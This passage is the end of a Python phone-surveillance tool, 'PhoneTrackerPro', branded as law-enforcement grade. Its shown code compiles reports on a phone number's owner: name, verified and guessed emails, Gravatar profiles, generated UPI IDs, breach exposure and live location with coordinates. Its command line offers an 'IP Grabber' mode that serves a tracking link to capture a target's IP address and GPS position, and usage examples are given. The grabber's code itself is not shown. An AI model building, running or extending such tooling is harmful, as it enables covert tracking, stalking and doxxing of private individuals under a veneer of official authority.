        live_city = self.live_location.get("city", self.consensus_city or "Unknown")
        sim_city = self.basic_info.get("location", "Unknown")
        roaming = "Yes" if live_city.lower() != sim_city.lower() else "No"
        # Evidence hash for integrity verification
        evidence_hash = self.audit_logger.compute_evidence_hash(data) if hasattr(self, 'audit_logger') else "N/A"
        # Classification banner
        cls_colors = {"UNCLASSIFIED": "#238636", "RESTRICTED": "#d29922", "CONFIDENTIAL": "#da3633", "SECRET": "#f85149"}
        cls_color = cls_colors.get(self.classification, "#d29922")
        osint_html = ""
        for platform, info in self.osint_results.items():
            if platform in ("google_mentions",):
                count = len(info) if isinstance(info, list) else 0
                osint_html += f"<tr><td>Google</td><td>{count} hits</td></tr>"
            elif platform == "upi_possible":
                osint_html += f"<tr><td>UPI IDs</td><td>{len(info)} generated</td></tr>"
            elif platform in ("possible_emails", "truecaller_email", "gravatar"):
                continue  # shown separately
            elif isinstance(info, dict):
                found = info.get("found", info.get("registered", False))
                st = "Found" if found else "Not found"
                detail = info.get("name", info.get("status", ""))
                osint_html += f"<tr><td>{platform.title()}</td><td>{st} - {detail}</td></tr>"
        votes_html = ""
        for v in self.all_votes:
            votes_html += f"<tr><td>{v.get('city','?')}</td><td>{v.get('source','?')}</td><td>{v.get('confidence',0):.0%}</td></tr>"
        ip_html = ""
        if self.ip_grab_results:
            for k, v in self.ip_grab_results.items():
                ip_html += f"<tr><td>{k}</td><td>{v}</td></tr>"
        # Deep OSINT / breach / spam summary
        deep_html = ""
        if self.deep_osint:
            spam = self.deep_osint.get("spam_reports", [])
            breaches = self.deep_osint.get("breach_check", {})
            web = self.deep_osint.get("web_mentions", [])
            if isinstance(spam, list) and len(spam) > 0:
                deep_html += f"<tr><td>Spam Databases</td><td>Flagged on {len(spam)} source(s)</td></tr>"
                for s in spam:
                    deep_html += f"<tr><td>  &rarr; {s.get('source','?')}</td><td>{'Flagged' if s.get('flagged') else 'Clean'}</td></tr>"
            if isinstance(breaches, dict) and breaches:
                deep_html += f"<tr><td>Breach Sources</td><td>{breaches.get('sources_found', 0)} found</td></tr>"
                for src in breaches.get("sources", []):
                    deep_html += f"<tr><td>  > {src.get('name','?')}</td><td>{src.get('status','?')}</td></tr>"
            if web:
                deep_html += f"<tr><td>Web Mentions</td><td>{len(web)} results</td></tr>"
        # Possible emails
        email_html = ""
        tc_email = self.osint_results.get("truecaller_email", "")
        if tc_email:
            email_html += f"<tr><td>Truecaller Email</td><td><strong>{tc_email}</strong></td></tr>"
        possible_emails = self.osint_results.get("possible_emails", [])
        if possible_emails:
            email_html += "<tr><td>Guessed Emails</td><td>" + "<br>".join(possible_emails[:5]) + "</td></tr>"
        gravatar = self.osint_results.get("gravatar", [])
        if gravatar:
            for gp in gravatar:
                email_html += f"<tr><td>Gravatar</td><td>{gp.get('display_name','')} ({gp.get('url','')})</td></tr>"
        # Audit trail
        audit_html = ""
        if hasattr(self, 'audit_logger'):
            for entry in self.audit_logger.get_trail():
                audit_html += f"<tr><td>{entry.get('timestamp','')}</td><td>{entry.get('action','')}</td><td>{entry.get('detail','')}</td></tr>"
        html = f"""<!DOCTYPE html>
<html><head><meta charset="utf-8"><title>LEA Phone Intelligence Report - {self.phone_number}</title>
<style>
*{{box-sizing:border-box}}
body{{background:#0a0e14;color:#c9d1d9;font-family:'Segoe UI',Arial,sans-serif;margin:0;padding:0}}
.classification-banner{{background:{cls_color};color:white;text-align:center;padding:8px;font-weight:bold;font-size:1.1em;letter-spacing:2px;position:sticky;top:0;z-index:100}}
.container{{max-width:1100px;margin:0 auto;padding:20px 30px}}
h1{{color:#58a6ff;border-bottom:2px solid #30363d;padding-bottom:10px;font-size:1.6em}}
h2{{color:#f0883e;margin-top:30px;font-size:1.15em;border-left:4px solid #f0883e;padding-left:10px}}
table{{border-collapse:collapse;width:100%;margin:10px 0}}
th,td{{border:1px solid #30363d;padding:10px;text-align:left;font-size:0.92em}}
th{{background:#161b22;color:#58a6ff}}
tr:nth-child(even){{background:#0d1117}}
tr:nth-child(odd){{background:#161b22}}
.badge{{display:inline-block;padding:3px 10px;border-radius:12px;font-size:0.85em;font-weight:bold}}
.green{{background:#238636;color:white}}
.red{{background:#da3633;color:white}}
.yellow{{background:#d29922;color:white}}
.header{{background:linear-gradient(135deg,#161b22,#0d1117);padding:25px;border-radius:10px;margin-bottom:20px;border:1px solid #30363d}}
.case-meta{{display:grid;grid-template-columns:1fr 1fr;gap:10px;background:#0d1117;padding:15px;border-radius:8px;border:1px solid #30363d;margin:15px 0}}
.case-meta span{{color:#8b949e;font-size:0.85em}}
.case-meta strong{{color:#c9d1d9}}
.evidence-box{{background:#0d1117;border:2px solid #30363d;border-radius:8px;padding:15px;margin:15px 0;font-family:monospace;font-size:0.82em;word-break:break-all;color:#8b949e}}
.footer{{margin-top:30px;padding:20px;border-top:2px solid #30363d;color:#484f58;font-size:0.82em;text-align:center}}
.legal{{background:#1c1208;border:1px solid #d29922;border-radius:8px;padding:15px;margin-top:20px;color:#d29922;font-size:0.85em}}
@media print{{.classification-banner{{position:fixed;top:0;left:0;right:0}} body{{background:white;color:black}} th{{background:#ddd;color:black}} td{{border-color:#999}}}}
</style></head><body>
<div class="classification-banner">{self.classification} - LAW ENFORCEMENT SENSITIVE</div>
<div class="container">
<div class="header">
<h1>LAW ENFORCEMENT PHONE INTELLIGENCE REPORT</h1>
<p style="color:#8b949e">PhoneTrackerPro v{VERSION} - Law Enforcement Grade Intelligence System</p>
</div>
<div class="case-meta">
<div><span>Case ID</span><br><strong>{self.case_id}</strong></div>
<div><span>Investigating Officer</span><br><strong>{self.officer_name}</strong></div>
<div><span>Unit / Department</span><br><strong>{self.unit}</strong></div>
<div><span>Classification</span><br><strong style="color:{cls_color}">{self.classification}</strong></div>
<div><span>Target Number</span><br><strong>{self.phone_number}</strong></div>
<div><span>Report Generated</span><br><strong>{datetime.now().strftime('%Y-%m-%d %H:%M:%S IST')}</strong></div>
</div>
<h2>Subject / SIM Registration Details</h2>
<table><tr><th>Field</th><th>Value</th></tr>
<tr><td>Phone Number (E.164)</td><td><strong>{self.phone_number}</strong></td></tr>
<tr><td>Country / Region</td><td>{self.basic_info.get('country','N/A')}</td></tr>
<tr><td>Carrier / Operator</td><td>{self.basic_info.get('carrier','N/A')}</td></tr>
<tr><td>SIM Registration City</td><td>{sim_city}</td></tr>
<tr><td>Line Type</td><td>{self.basic_info.get('line_type','N/A')}</td></tr>
<tr><td>Number Format (Intl)</td><td>{self.basic_info.get('international_format','N/A')}</td></tr>
<tr><td>Telecom Circle</td><td>{self.telecom_circle.get('circle','N/A')}</td></tr>
<tr><td>IMSI Range</td><td>{self.basic_info.get('imsi_range','N/A')}</td></tr>
<tr><td>MCC-MNC</td><td>{self.basic_info.get('mcc_mnc','N/A')}</td></tr>
<tr><td>Number Validity</td><td>{self.basic_info.get('valid','N/A')}</td></tr>
</table>
<h2>Subject Identification</h2>
<table><tr><th>Field</th><th>Value</th></tr>
<tr><td>Name (OSINT)</td><td><strong>{self.owner_name or 'Unknown - Requires CDR / Operator RFI'}</strong></td></tr>
<tr><td>Email (Verified)</td><td>{self.osint_results.get('truecaller_email', 'Not available')}</td></tr>
</table>
{'<h2>Email Intelligence</h2><table><tr><th>Source</th><th>Detail</th></tr>' + email_html + '</table>' if email_html else ''}
<h2>Location Intelligence (Multi-Source Consensus)</h2>
<table><tr><th>Field</th><th>Value</th></tr>
<tr><td>Consensus Location</td><td><span class="badge green"><strong>{live_city}</strong></span></td></tr>
<tr><td>SIM Registration City</td><td>{sim_city}</td></tr>
<tr><td>Roaming Indicator</td><td><span class="badge {'red' if roaming=='Yes' else 'green'}">{roaming}</span></td></tr>
<tr><td>Intelligence Sources</td><td>{len(self.all_votes)} API votes</td></tr>
<tr><td>Latitude</td><td>{self.geo_results.get('latitude','N/A')}</td></tr>
<tr><td>Longitude</td><td>{self.geo_results.get('longitude','N/A')}</td></tr>
<tr><td>Resolved Address</td><td>{self.geo_results.get('formatted_address','N/A')}</td></tr>
</table>
{'<h2>Source Vote Breakdown</h2><table><tr><th>City</th><th>API Source</th><th>Confidence</th></tr>' + votes_html + '</table>' if votes_html else ''}
{'<h2>IP / Device Intelligence (Grabber)</h2><table><tr><th>Field</th><th>Value</th></tr>' + ip_html + '</table>' if ip_html else ''}
<h2>OSINT Platform Intelligence</h2>
<table><tr><th>Platform</th><th>Finding</th></tr>{osint_html}</table>
{'<h2>Threat / Risk Intelligence</h2><table><tr><th>Indicator</th><th>Detail</th></tr>' + deep_html + '</table>' if deep_html else ''}
{'<h2>Evidence Audit Trail</h2><table><tr><th>Timestamp</th><th>Action</th><th>Detail</th></tr>' + audit_html + '</table>' if audit_html else ''}
<div class="evidence-box">
<strong>Evidence Integrity Hash (SHA-256):</strong><br>{evidence_hash}
</div>
<div class="legal">
<strong>LEGAL DISCLAIMER & CHAIN OF CUSTODY NOTICE</strong><br>
This intelligence report was generated by an automated OSINT collection system. All data was obtained from publicly
accessible sources and APIs. This report does NOT constitute legally admissible evidence without proper chain-of-custody
documentation and judicial authorization. The investigating officer must verify all findings through official channels
(CDR from telecom operator via court order, subscriber details via Sec 91 CrPC / Sec 94 BNSS).<br><br>
<strong>Authorized Use Only:</strong> This document contains sensitive law enforcement information. Unauthorized
disclosure is prohibited under the Official Secrets Act, 1923 and IT Act, 2000 Sec 72.
</div>
<div class="footer">
<p>Generated by <strong>PhoneTrackerPro v{VERSION}</strong> - Law Enforcement Grade Intelligence System</p>
<p>Case ID: {self.case_id} | Officer: {self.officer_name} | Classification: {self.classification}</p>
<p style="color:{cls_color};font-weight:bold;margin-top:10px">{self.classification}</p>
</div>
</div>
</body></html>"""
        with open(filename, "w", encoding="utf-8") as f:
            f.write(html)
        console.print(f"[green]  > HTML Report (LEA Grade): {filename}[/green]")
        self._log_evidence("report_generated", f"HTML report saved: {filename}")
        return filename


    def generate_json_report(self):
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        num = self.phone_number.replace("+", "").replace(" ", "")
        filename = f"output/phone_intel_{num}_{ts}.json"
        os.makedirs("output", exist_ok=True)
        with open(filename, "w", encoding="utf-8") as f:
            json.dump(self.to_dict(), f, indent=2, ensure_ascii=False, default=str)
        console.print(f"[green]  ✓ JSON Report: {filename}[/green]")
        return filename

    def generate_reports(self, no_map=False, no_report=False, json_only=False):
        console.print(Panel("[bold cyan]PHASE 7: GENERATING REPORTS[/bold cyan]", border_style="cyan"))
        map_file = None
        if not no_map:
            map_file = self.generate_map()
        json_file = self.generate_json_report()
        html_file = None
        if not no_report and not json_only:
            html_file = self.generate_html_report()
        console.print()
        return {"map": map_file, "json": json_file, "html": html_file}


# =======================================================================
# MAIN ENTRY POINT
# =======================================================================
def _print_summary(tracker):
    console.print()
    # Classification banner
    cls_styles = {"UNCLASSIFIED": "green", "RESTRICTED": "yellow", "CONFIDENTIAL": "red", "SECRET": "bold red"}
    cls_style = cls_styles.get(tracker.classification, "yellow")
    console.print(Panel(
        f"[bold {cls_style}]  {tracker.classification} — LAW ENFORCEMENT SENSITIVE  [/bold {cls_style}]",
        border_style=cls_style))
    console.print(Panel("[bold white]📊 INTELLIGENCE SUMMARY[/bold white]", border_style="bright_white"))
    # Case metadata
    case_table = Table(border_style="dim", show_lines=True, title="[bold cyan]Case Information[/bold cyan]")
    case_table.add_column("Field", style="bold", width=25)
    case_table.add_column("Value", style="white", width=50)
    case_table.add_row("Case ID", tracker.case_id)
    case_table.add_row("Officer", tracker.officer_name)
    case_table.add_row("Unit", tracker.unit)
    case_table.add_row("Classification", f"[{cls_style}]{tracker.classification}[/{cls_style}]")
    case_table.add_row("Report Time", datetime.now().strftime("%Y-%m-%d %H:%M:%S IST"))
    console.print(case_table)
    console.print()
    # Intel table
    table = Table(border_style="bright_white", show_lines=True, title="[bold cyan]Subject Intelligence[/bold cyan]")
    table.add_column("Category", style="bold cyan", width=25)
    table.add_column("Result", style="white", width=50)
    table.add_row("Phone Number", tracker.phone_number)
    table.add_row("Country", tracker.basic_info.get("country", "N/A"))
    table.add_row("Carrier", tracker.basic_info.get("carrier", "N/A"))
    table.add_row("SIM Location", tracker.basic_info.get("location", "N/A"))
    table.add_row("Telecom Circle", tracker.telecom_circle.get("circle", "N/A"))
    table.add_row("MCC-MNC", tracker.basic_info.get("mcc_mnc", "N/A"))
    live_city = tracker.live_location.get("city", tracker.consensus_city or "N/A")
    table.add_row("Live Location", f"[bold green]{live_city}[/bold green]" if live_city != "N/A" else "N/A")
    sim_city = tracker.basic_info.get("location", "")
    live_norm = live_city.lower().replace("new ", "")
    sim_norm = sim_city.lower().replace("new ", "")
    if live_city and sim_city and live_norm != sim_norm and live_city != "N/A":
        table.add_row("Roaming", "[bold red]YES — Different from SIM city[/bold red]")
    else:
        table.add_row("Roaming", "[green]No[/green]")
    table.add_row("API Votes", f"{len(tracker.all_votes)} sources")
    table.add_row("Owner Name", tracker.owner_name or "Unknown")
    # Show verified email from Truecaller
    tc_email = tracker.osint_results.get("truecaller_email", "")
    if tc_email:
        table.add_row("Owner Email", f"[bold green]{tc_email}[/bold green]")
    osint_found = sum(1 for v in tracker.osint_results.values()
                      if isinstance(v, dict) and (v.get("found") or v.get("registered")))
    table.add_row("OSINT Hits", f"{osint_found} platforms")
    # Show possible emails
    possible_emails = tracker.osint_results.get("possible_emails", [])
    if possible_emails:
        top_emails = possible_emails[:3]
        table.add_row("Possible Emails", "\n".join(top_emails) + (f"\n+{len(possible_emails)-3} more" if len(possible_emails) > 3 else ""))
    # Show Gravatar hits
    gravatar = tracker.osint_results.get("gravatar", [])
    if gravatar:
        grav_names = [p.get("display_name", "") for p in gravatar if p.get("display_name")]
        if grav_names:
            table.add_row("Gravatar Profile", ", ".join(grav_names))
    if tracker.ip_grab_results:
        table.add_row("IP Captured", tracker.ip_grab_results.get("ip", "N/A"))
        if tracker.ip_grab_results.get("gps_lat"):
            table.add_row("GPS Location", f"{tracker.ip_grab_results['gps_lat']}, {tracker.ip_grab_results['gps_lon']}")
    lat = tracker.geo_results.get("latitude")
    lon = tracker.geo_results.get("longitude")
    if lat and lon:
        table.add_row("Coordinates", f"{lat:.4f}, {lon:.4f}")
    # Deep OSINT threat indicators
    if tracker.deep_osint:
        spam = tracker.deep_osint.get("spam_reports", [])
        if isinstance(spam, list) and len(spam) > 0:
            table.add_row("Spam Risk", f"[bold red]Flagged on {len(spam)} DB(s)[/bold red]")
        breaches = tracker.deep_osint.get("breach_check", {})
        if isinstance(breaches, dict) and breaches.get("sources_found", 0) > 0:
            table.add_row("Breach Exposure", f"[bold red]{breaches['sources_found']} sources[/bold red]")
    console.print(table)
    # Evidence integrity
    console.print()
    data = tracker.to_dict()
    evidence_hash = tracker.audit_logger.compute_evidence_hash(data) if hasattr(tracker, 'audit_logger') else "N/A"
    console.print(Panel(
        f"[dim]Evidence Integrity (SHA-256):[/dim]\n[bold white]{evidence_hash}[/bold white]",
        border_style="dim", title="[bold]Chain of Custody[/bold]"))


def main():
    console.print(BANNER)
    parser = argparse.ArgumentParser(
        prog="phone_tracker.py",
        description=f"PhoneTrackerPro v{VERSION} — Law Enforcement Grade Phone Intelligence System",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
━━━━━━━━━━━━━━━━━━━ USAGE EXAMPLES ━━━━━━━━━━━━━━━━━━━━

  FULL SCAN (all phases):
    python phone_tracker.py +919876543210

  QUICK SCAN (basic info + telecom circle only):
    python phone_tracker.py +919876543210 --quick

  LAW ENFORCEMENT MODE (with case metadata):
    python phone_tracker.py +919876543210 --case-id "FIR-2026-0042" --officer "SI Sharma" --unit "Cyber Cell Delhi" --classification CONFIDENTIAL

  IP GRABBER MODE (start tracking link server):
    python phone_tracker.py +919876543210 --grab
    python phone_tracker.py +919876543210 --grab --grab-port 9999

  SKIP PHASES (faster scan):
    python phone_tracker.py +919876543210 --skip-live
    python phone_tracker.py +919876543210 --skip-osint
    python phone_tracker.py +919876543210 --skip-deep
    python phone_tracker.py +919876543210 --skip-osint --skip-deep

  REPORT OPTIONS:
    python phone_tracker.py +919876543210 --json-only
    python phone_tracker.py +919876543210 --no-map
    python phone_tracker.py +919876543210 --no-report
    python phone_tracker.py +919876543210 --output-dir results/

  INPUT FORMATS (all work):
    python phone_tracker.py +919876543210
    python phone_tracker.py 9876543210
    python phone_tracker.py 09876543210
    python phone_tracker.py +1-202-555-0100
        """
    )
    parser.add_argument("phone", help="Phone number (e.g., +919876543210 or 9876543210)")

    scan_group = parser.add_argument_group("Scan Options")
    scan_group.add_argument("--quick", action="store_true", help="Quick mode: basic info + telecom only")
    scan_group.add_argument("--skip-live", action="store_true", help="Skip live location (multi-API) detection")
    scan_group.add_argument("--skip-osint", action="store_true", help="Skip OSINT platform probes (WhatsApp, Telegram, etc.)")
    scan_group.add_argument("--skip-deep", action="store_true", help="Skip deep OSINT (spam DB, breach check, web mentions)")

    case_group = parser.add_argument_group("Case Management (Law Enforcement)")
    case_group.add_argument("--case-id", type=str, default=None, metavar="ID", help="Case/FIR number (default: auto-generated UUID)")
    case_group.add_argument("--officer", type=str, default=None, metavar="NAME", help="Investigating officer name")
    case_group.add_argument("--unit", type=str, default=None, metavar="UNIT", help="Department / Unit (e.g., 'Cyber Cell Mumbai')")
    case_group.add_argument("--classification", type=str, default="RESTRICTED",
                            choices=["UNCLASSIFIED", "RESTRICTED", "CONFIDENTIAL", "SECRET"],
                            metavar="LEVEL", help="Classification level: UNCLASSIFIED, RESTRICTED, CONFIDENTIAL, SECRET (default: RESTRICTED)")

    grab_group = parser.add_argument_group("IP Grabber")
    grab_group.add_argument("--grab", action="store_true", help="Launch IP Grabber link server to capture target's IP/GPS")
    grab_group.add_argument("--grab-port", type=int, default=8888, metavar="PORT", help="Port for IP Grabber server (default: 8888)")

    report_group = parser.add_argument_group("Report Options")
    report_group.add_argument("--no-map", action="store_true", help="Skip Folium map generation")
    report_group.add_argument("--no-report", action="store_true", help="Skip HTML report generation")
    report_group.add_argument("--json-only", action="store_true", help="Only generate JSON report (no HTML/map)")
    report_group.add_argument("--output-dir", type=str, default="output", metavar="DIR", help="Output directory for reports (default: output/)")

    parser.add_argument("--version", action="version", version=f"PhoneTrackerPro v{VERSION}")
    args = parser.parse_args()

    # Ensure output directory exists
    os.makedirs(args.output_dir, exist_ok=True)

    # Show scan config
    scan_mode = "QUICK" if args.quick else "IP GRABBER" if args.grab else "FULL"
    skips = []
    if args.skip_live: skips.append("Live Location")
    if args.skip_osint: skips.append("OSINT")
    if args.skip_deep: skips.append("Deep OSINT")
    skip_str = ", ".join(skips) if skips else "None"

    # Check API keys
    api_status = []
    api_status.append(("NUMVERIFY", "✓" if os.getenv("NUMVERIFY_API_KEY") else "✗"))
    api_status.append(("ABSTRACT", "✓" if os.getenv("ABSTRACT_API_KEY") else "✗"))
    api_status.append(("IPINFO", "✓" if os.getenv("IPINFO_TOKEN") else "✗"))
    api_status.append(("OPENCAGE", "✓" if os.getenv("OPENCAGE_API_KEY") else "✗"))
    api_str = "  ".join([f"{'[green]' if s == '✓' else '[red]'}{n}: {s}{'[/green]' if s == '✓' else '[/red]'}" for n, s in api_status])

    # Classification display
    cls_styles = {"UNCLASSIFIED": "green", "RESTRICTED": "yellow", "CONFIDENTIAL": "red", "SECRET": "bold red"}
    cls_style = cls_styles.get(args.classification, "yellow")

    console.print(Panel(
        f"[bold white]  Mode:[/bold white] {scan_mode}  |  [bold white]Skipping:[/bold white] {skip_str}\n"
        f"  API Keys: {api_str}\n"
        f"  [bold white]Classification:[/bold white] [{cls_style}]{args.classification}[/{cls_style}]  |  "
        f"[bold white]Case:[/bold white] {args.case_id or 'Auto-generated'}  |  "
        f"[bold white]Officer:[/bold white] {args.officer or 'Not specified'}\n"
        f"  [bold white]Output:[/bold white] {args.output_dir}/",
        title=f"[bold cyan]⚙ Scan Configuration[/bold cyan]",
        border_style="dim"))

    tracker = PhoneTrackerPro(args.phone)
    # Apply case management overrides
    if args.case_id:
        tracker.case_id = args.case_id
    if args.officer:
        tracker.officer_name = args.officer
        tracker.officer = args.officer
    if args.unit:
        tracker.unit = args.unit
    tracker.classification = args.classification

    # Phase 1: Parse & Validate
    console.print()
    if not tracker.parse_number():
        console.print("[red]  ✗ Invalid phone number. Exiting.[/red]")
        sys.exit(1)

    # Phase 2: Basic Info
    tracker.get_basic_info()
    tracker.display_basic_info()

    # Phase 3: Telecom Circle (India only)
    tracker.detect_telecom_circle()

    if args.quick:
        console.print(Panel("[yellow]  Quick mode — skipping advanced phases.[/yellow]", border_style="yellow"))
        tracker.generate_reports(no_map=args.no_map, no_report=args.no_report, json_only=args.json_only)
        _print_summary(tracker)
        return

    # Phase 4: Live Location (multi-API cross-reference)
    if not args.skip_live:
        tracker.detect_live_location()
        tracker._log_evidence("live_location_complete", f"Consensus: {tracker.consensus_city}, Votes: {len(tracker.all_votes)}")

    # Phase 5: Geolocation (OpenCage / Nominatim)
    geo_city = tracker.live_location.get("city") or tracker.basic_info.get("location")
    if geo_city:
        tracker.advanced_geolocate(geo_city)
        tracker.display_geolocation()
        tracker._log_evidence("geolocation_complete", f"Resolved: {tracker.geo_results.get('formatted_address', 'N/A')}")

    # Phase 6: OSINT Platform Probes
    if not args.skip_osint:
        tracker.run_osint()
        osint_hits = sum(1 for v in tracker.osint_results.values()
                         if isinstance(v, dict) and (v.get("found") or v.get("registered")))
        tracker._log_evidence("osint_complete", f"Platforms found: {osint_hits}, Owner: {tracker.owner_name or 'Unknown'}")

    # Phase 7: Deep OSINT
    if not args.skip_deep:
        tracker.run_deep_osint()
        tracker._log_evidence("deep_osint_complete", f"Breach sources: {tracker.deep_osint.get('breach_check', {}).get('sources_found', 0)}")

    # Phase 8: Reports
    tracker.generate_reports(no_map=args.no_map, no_report=args.no_report, json_only=args.json_only)

    # Final Summary
    _print_summary(tracker)

    console.print()
    console.print(Panel(
        f"[bold green]  ✓ Intelligence collection complete![/bold green]\n"
        f"  [dim]Case: {tracker.case_id}  |  Classification: {tracker.classification}[/dim]",
        border_style="green"))
    console.print()

    # Phase 9: IP Grabber Mode (runs AFTER full scan so all intel is gathered)
    if args.grab:
        console.print(Panel("[bold yellow]  Launching IP Grabber server... (full scan data saved above)[/bold yellow]", border_style="yellow"))
        tracker.generate_ip_grabber(port=args.grab_port)
        return  # Server runs until Ctrl+C


if __name__ == "__main__":
    main()
